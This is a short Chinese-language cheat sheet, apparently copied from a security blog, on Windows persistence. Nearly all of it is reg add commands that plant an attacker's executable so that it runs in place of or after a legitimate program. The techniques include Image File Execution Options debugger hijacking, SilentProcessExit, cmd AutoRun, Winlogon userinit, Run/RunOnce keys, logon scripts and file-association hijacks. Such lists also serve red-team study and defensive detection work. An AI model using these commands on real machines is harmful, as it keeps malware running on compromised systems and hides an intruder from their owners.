# windows 权限维持

---

来源：http://diego.team/2021/03/02/Windows-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/

**映像劫持**

- 1.效果：运行xxx.exe即运行m的exe，但不会运行xxx.exe

（管理员权限）通过修改下述注册表，添加劫持的exe名称，添加字符串值Debugger为你的m的路径

```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ 
即
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ xxx.exe\Debugge(类型：REG_SZ)：m的exe路径
```

也可通过cmd命令进行设置

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GetPass.exe" /v Debugger /t REG_SZ /d "exe路径"
查看是否设置成功
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\GetPass.exe"
```

- 2.效果：目标程序结束后，再自动执行（A程序为正常运行的，B为A退出后运行）
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\A.exe" /v GlobalFlag /t REG_DWORD /d 512

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\A.exe" /v ReportingMode /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\A.exe" /v MonitorProcess /t REG_SZ /d "B.exe路径"
```

**跟随cmd自启动**

效果：使用cmd.exe就会伴随启动

```
reg add "\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "exe路径"
```

**自启动**

- HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windowse" /v load /t REG_SZ /d "exe路径"
```

- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
往userinit 追加数据 用逗号分隔可以执行多程序
```

- Run和Runonce
```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
```

- HKEY_CURRENT_USER\Environment

```
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "exe路径"
```

**修改文件关联注册表**

运行相关后缀文件都会运行m

```
exe关联  HKEY_CLASSES_ROOT\exefile\shell\open\command  #将"%1" %* -> exe路径 "%1" %*
txt关联  HKEY_CLASSES_ROOT\txtfile\shell\open\command
xxx关联  HKEY_CLASSES_ROOT\后缀+file\shell\open\command
```

